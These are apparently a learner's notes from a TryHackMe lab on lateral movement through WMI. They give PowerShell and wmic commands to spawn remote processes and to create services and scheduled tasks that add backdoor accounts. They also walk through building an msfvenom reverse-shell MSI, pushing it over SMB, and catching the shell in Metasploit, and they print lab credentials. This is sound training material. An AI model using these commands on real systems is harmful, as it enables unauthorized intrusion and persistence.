<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Moving Laterally using WMI</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>Moving Laterally using WMI</h1><br/><p><strong><h1>Moving Laterally Using WMI</h1></strong></p><p></p><p>We can also perform many techniques discussed in the previous task  differently by using Windows Management Instrumentation (WMI). WMI is  Windows implementation of Web-Based Enterprise Management (WBEM), an  enterprise standard for accessing management information across  devices. </p><p></p><p>In simpler terms, WMI allows administrators to perform  standard management tasks that attackers can abuse to perform lateral  movement in various ways, which we&#39;ll discuss.</p><p></p><p><strong><h3>Connecting to WMI From Powershell</h3></strong></p><p></p><p>Before being able to connect to WMI using Powershell commands, we need to create a <strong>PSCredential</strong> <strong>object</strong> with our <strong>user</strong> and <strong>password</strong>. This object will be stored in the <strong>$credential</strong> variable and utilised throughout the techniques on this task:</p><p></p><p>##########################</p><p><em>$username = &#39;Administrator&#39;;</em></p><p><em>$password = &#39;Mypass123&#39;;</em></p><p><em>$securePassword = ConvertTo-SecureString $password -AsPlainText -Force;</em></p><p><em>$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword;</em></p><p>##########################</p><p></p><p>We then proceed to establish a WMI session using either of the following protocols:</p><p></p><p>    ▪ <strong>DCOM:</strong> RPC over IP will be used for connecting to WMI. This protocol uses port 135/TCP and ports 49152-65535/TCP, just as explained when using sc.exe.</p><p>    ▪ <strong>Wsman: </strong>WinRM will be used for connecting to WMI. This protocol uses ports 5985/TCP (WinRM HTTP) or 5986/TCP (WinRM HTTPS).</p><p></p><p>To establish a WMI session from Powershell, we can use the following commands and store the session on the <strong>$Session</strong> variable, which we will use throughout the room on the different techniques:</p><p></p><p>##########################</p><p><em>$Opt = New-CimSessionOption -Protocol DCOM</em></p><p><em>$Session = New-Cimsession -ComputerName TARGET -Credential $credential -SessionOption $Opt -ErrorAction Stop</em></p><p>##########################</p><p></p><p>The <strong>New-CimSessionOption</strong> cmdlet is used to configure the connection options for the WMI session, including the connection protocol. The <strong>options</strong> and <strong>credentials</strong> are then passed to the <strong>New-CimSession</strong> cmdlet to establish a session against a remote host.</p><p><strong><span style="text-decoration:underline;"></span></strong></p><p><strong><span style="text-decoration:underline;"></span></strong><strong><h3>Remote Process Creation Using WMI</h3></strong></p><p></p><p>    <strong>Ports:</strong></p><p>        135/TCP, 49152-65535/TCP (DCERPC)</p><p>        5985/TCP (WinRM HTTP) or 5986/TCP (WinRM HTTPS)</p><p>    <strong>Required Group Memberships: Administrators</strong></p><p></p><p>We can remotely spawn a process from Powershell by leveraging Windows Management Instrumentation (WMI), sending a WMI request to the Win32_Process class to spawn the process under the session we created before:</p><p></p><p>##########################</p><p><em>$Command = &quot;powershell.exe -Command Set-Content -Path C:\text.txt -Value Bazinga&quot;;</em></p><p><em></em></p><p><em>Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{</em></p><p><em>CommandLine = $Command</em></p><p><em>}</em></p><p>##########################</p><p></p><p></p><p>Notice that WMI won&#39;t allow you to see the output of any command but will indeed create the required process silently.</p><p></p><p>On legacy systems, the same can be done using wmic from the command prompt:</p><p></p><p><strong>wmic.exe /user:Administrator /password:Mypass123 /node:TARGET process call create &quot;cmd.exe /c calc.exe&quot; </strong></p><p></p><p></p><p><strong><h3>Creating Services Remotely with WMI</h3></strong></p><p></p><p><strong>    Ports:</strong></p><p>        135/TCP, 49152-65535/TCP (DCERPC)</p><p>        5985/TCP (WinRM HTTP) or 5986/TCP (WinRM HTTPS)</p><p><strong>    Required Group Memberships: Administrators</strong></p><p></p><p>We can create services with WMI through Powershell. To create a service called THMService2, we can use the following command:</p><p></p><p>##########################</p><p><em>Invoke-CimMethod -CimSession $Session -ClassName Win32_Service -MethodName Create -Arguments @{</em></p><p><em>Name = &quot;THMService2&quot;;</em></p><p><em>DisplayName = &quot;THMService2&quot;;</em></p><p><em>PathName = &quot;net user munra2 Pass123 /add&quot;; # Your payload</em></p><p><em>ServiceType = [byte]::Parse(&quot;16&quot;); # Win32OwnProcess : Start service in a new process</em></p><p><em>StartMode = &quot;Manual&quot;</em></p><p><em>}</em></p><p>##########################</p><p></p><p>And then, we can get a handle on the service and start it with the following commands:</p><p></p><p>##########################</p><p><em>$Service = Get-CimInstance -CimSession $Session -ClassName Win32_Service -filter &quot;Name LIKE &#39;THMService2&#39;&quot;</em></p><p><em>Invoke-CimMethod -InputObject $Service -MethodName StartService</em></p><p>##########################</p><p></p><p>Finally, we can stop and delete the service with the following commands:</p><p></p><p>##########################</p><p><em>Invoke-CimMethod -InputObject $Service -MethodName StopService</em></p><p><em>Invoke-CimMethod -InputObject $Service -MethodName Delete</em></p><p>##########################</p><p></p><p></p><p><strong><h3>Creating Scheduled Tasks Remotely with WMI</h3></strong></p><p></p><p><strong>    Ports:</strong></p><p>        135/TCP, 49152-65535/TCP (DCERPC)</p><p>        5985/TCP (WinRM HTTP) or 5986/TCP (WinRM HTTPS)</p><p><strong>    Required Group Memberships: Administrators</strong></p><p></p><p>We can create and execute scheduled tasks by using some cmdlets available in Windows default installations:</p><p></p><p>##########################</p><p><em># Payload must be split in Command and Args</em></p><p><em>$Command = &quot;cmd.exe&quot;</em></p><p><em>$Args = &quot;/c net user munra22 aSdf1234 /add&quot;</em></p><p><em></em></p><p><em>$Action = New-ScheduledTaskAction -CimSession $Session -Execute $Command -Argument $Args</em></p><p><em>Register-ScheduledTask -CimSession $Session -Action $Action -User &quot;NT AUTHORITY\SYSTEM&quot; -TaskName &quot;THMtask2&quot;</em></p><p><em>Start-ScheduledTask -CimSession $Session -TaskName &quot;THMtask2&quot;</em></p><p>##########################</p><p></p><p>To delete the scheduled task after it has been used, we can use the following command:</p><p></p><p>##########################</p><p><em>Unregister-ScheduledTask -CimSession $Session -TaskName &quot;THMtask2&quot;</em></p><p>##########################</p><p></p><p></p><p><strong><h3>Installing MSI packages through WMI</h3></strong></p><p></p><p><strong>    Ports:</strong></p><p>        135/TCP, 49152-65535/TCP (DCERPC)</p><p>        5985/TCP (WinRM HTTP) or 5986/TCP (WinRM HTTPS)</p><p><strong>    Required Group Memberships: Administrators</strong></p><p></p><p>MSI is a file format used for installers. If we can copy an MSI package to the target system, we can then use WMI to attempt to install it for us. The file can be copied in any way available to the attacker. Once the MSI file is in the target system, we can attempt to install it by invoking the Win32_Product class through WMI:</p><p></p><p>##########################</p><p><em>Invoke-CimMethod -CimSession $Session -ClassName Win32_Product -MethodName Install -Arguments @{</em></p><p><em>PackageLocation = &quot;C:\Windows\myinstaller.msi&quot;;</em></p><p><em>Options = &quot;&quot;;</em></p><p><em>AllUsers = $false</em></p><p><em>}</em></p><p>##########################</p><p></p><p>We can achieve the same by us using wmic in <strong>legacy</strong> systems:</p><p></p><p><strong>wmic /node:TARGET /user:DOMAIN\USER product call install PackageLocation=c:\Windows\myinstaller.msi</strong></p><p></p><p><strong>Example: wmic /node:thmiis.za.tryhackme.com /user:za.tryhackme.com\t1_corine.waters product call install PackageLocation=c:\Windows\cybex.msi</strong></p><p></p><p><strong>Note:</strong> To Run the Legacy CMD command, we need a CMD prompt with the token of Administrator user. Thus, we need to use &#39;<strong>runas</strong>&#39; command. If Used in <strong>SSH</strong> connection. We need a second reverse shell with the help of nc as we cannot access the new CMD prpmpt. However, if <strong>RDP</strong> is used we can access the newly created CMD prompt &amp; use the example command above.</p><p></p><p><strong><h2>Room Task</h2></strong></p><p></p><p><strong>ssh za\\&lt;AD Username&gt;@thmjmp2.za.tryhackme.com</strong></p><p></p><p>For this exercise, we will assume we have already captured some credentials with administrative access:</p><p></p><p><strong>User: ZA.TRYHACKME.COM\t1_corine.waters</strong></p><p><strong>Password: Korine.1994</strong></p><p></p><p>We&#39;ll show how to use those credentials to move laterally to THM-IIS using WMI and MSI packages. Feel free to try the other methods presented during this task.</p><p></p><p>We will start by creating our MSI payload with msfvenom from our attacker machine:</p><p><strong>Note:</strong> Since you will be sharing the lab with others, you&#39;ll want to use a different filename for your payload instead of &quot;myinstaller.msi&quot; to avoid overwriting someone else&#39;s payload.</p><p></p><p><strong>msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.50.67.27 LPORT=8888 -f msi -o cybex.msi</strong></p><p></p><p>We then copy the payload using SMB or any other method available:</p><p></p><p><strong>smbclient -c &#39;put cybex.msi&#39; -U t1_corine.waters -W ZA &#39;//thmiis.za.tryhackme.com/admin$/&#39;</strong></p><p></p><p><strong>Note:</strong> Since we copied our payload to the ADMIN$ share, it will be available at <strong>C:\Windows\ </strong>on the server.</p><p>We start a handler to receive the reverse shell from Metasploit:</p><p></p><p><strong>msf6 exploit(multi/handler) &gt; set LHOST 10.50.67.27</strong></p><p><strong>msf6 exploit(multi/handler) &gt; set LPORT 8888</strong></p><p><strong>msf6 exploit(multi/handler) &gt; set payload windows/x64/shell_reverse_tcp</strong></p><p><strong>msf6 exploit(multi/handler) &gt; exploit </strong></p><p></p><p><strong>Powershell</strong></p><p>Let&#39;s start a WMI session against THMIIS from a Powershell console:</p><p></p><p>##########################</p><p><em>$username = &#39;t1_corine.waters&#39;;</em></p><p><em>$password = &#39;Korine.1994&#39;;</em></p><p><em>$securePassword = ConvertTo-SecureString $password -AsPlainText -Force;</em></p><p><em>$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword;</em></p><p><em>$Opt = New-CimSessionOption -Protocol DCOM</em></p><p><em>$Session = New-Cimsession -ComputerName thmiis.za.tryhackme.com -Credential $credential -SessionOption $Opt -ErrorAction Stop</em></p><p>##########################</p><p></p><p>We then invoke the Install method from the Win32_Product class to trigger the payload:</p><p></p><p>##########################</p><p><em>Invoke-CimMethod -CimSession $Session -ClassName Win32_Product -MethodName Install -Arguments @{</em></p><p><em>PackageLocation = &quot;C:\Windows\myinstaller.msi&quot;;</em></p><p><em>Options = &quot;&quot;;</em></p><p><em>AllUsers = $false</em></p><p><em>}</em></p><p>##########################</p><p></p><p>Once, the above runs, we will get a reverse shell.</p></div>
</body>
</html>
